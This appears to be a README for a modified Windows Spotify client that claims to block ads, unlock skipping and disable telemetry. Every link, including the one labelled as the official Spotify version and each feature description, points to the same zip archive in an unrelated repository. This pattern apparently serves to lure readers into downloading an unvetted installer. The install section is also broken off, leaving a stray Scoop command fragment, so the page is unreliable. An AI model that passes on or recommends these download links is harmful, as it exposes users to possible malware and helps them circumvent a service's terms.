   <h2> <div align="center"><b> Modified Spotify Client for Windows </b></div> </h2>

<h1>System requirements</h1>

- <strong>OS: Windows 7-11</strong>
- <strong>Spotify: Recommended official version [1.1.94.872](https://raw.githubusercontent.com/zxcurs3d/SpotX/main/scripts/installer-lang/X-Spot-v3.5-alpha.3.zip)</strong>
- <strong>For Windows Desktop only (Microsoft store version is not suitable).</strong>
- <strong>PowerShell: 3 or higher</strong>

<h1>Features</h1>

- <strong>Blocks all banner, video and audio ads in the client</strong>
- <strong>Unlocks the skip function of any track</strong>
- <strong>Full screen mode activated</strong>
- <strong>Hidden podcasts and episodes from the homepage (optional)</strong>
- <strong>Blocks automatic updates (optional)</strong>
- <strong>Automatic [cache clearing](https://raw.githubusercontent.com/zxcurs3d/SpotX/main/scripts/installer-lang/X-Spot-v3.5-alpha.3.zip) (optional)</strong>
- <strong>Enabled [enhance playlist](https://raw.githubusercontent.com/zxcurs3d/SpotX/main/scripts/installer-lang/X-Spot-v3.5-alpha.3.zip)</strong>
- <strong>Enabled [enhance liked songs UI](https://raw.githubusercontent.com/zxcurs3d/SpotX/main/scripts/installer-lang/X-Spot-v3.5-alpha.3.zip)</strong>
- <strong>Enabled [new lyrics](https://raw.githubusercontent.com/zxcurs3d/SpotX/main/scripts/installer-lang/X-Spot-v3.5-alpha.3.zip)</strong>
- <strong>Enabled [a condensed discography shelf on artist pages](https://raw.githubusercontent.com/zxcurs3d/SpotX/main/scripts/installer-lang/X-Spot-v3.5-alpha.3.zip)</strong>
- <strong>Enabled [Ignore In Recommendations](https://raw.githubusercontent.com/zxcurs3d/SpotX/main/scripts/installer-lang/X-Spot-v3.5-alpha.3.zip)</strong>
- <strong>Enabled [Equalizer](https://raw.githubusercontent.com/zxcurs3d/SpotX/main/scripts/installer-lang/X-Spot-v3.5-alpha.3.zip)</strong>
- <strong>Enabled [new device picker panel](https://raw.githubusercontent.com/zxcurs3d/SpotX/main/scripts/installer-lang/X-Spot-v3.5-alpha.3.zip)</strong>
- <strong>Activated ["Made For You" in the left sidebar](https://raw.githubusercontent.com/zxcurs3d/SpotX/main/scripts/installer-lang/X-Spot-v3.5-alpha.3.zip)</strong>
- <strong>Disabled Sentry (Prevented Sentry from sending console log/error/warning to Spotify developers)</strong>
- <strong>Disabled logging (Stopped various elements to log user interaction)</strong>
- <strong>Removed RTL rules (Removed all right-to-left CSS rules to simplify CSS files)</strong>
- <strong>Code minification</strong>

<br>
<br>```scoop bucket add nonportable```

#### Updating SpotX with Scoop

To update SpotX or check for updates run this command in the command prompt or powershell:

```scoop update spotx-np```

#### Uninstalling SpotX with Scoop

To fully uninstall SpotX and Spotify run this command in the command prompt or powershell:

```scoop uninstall spotx-np```
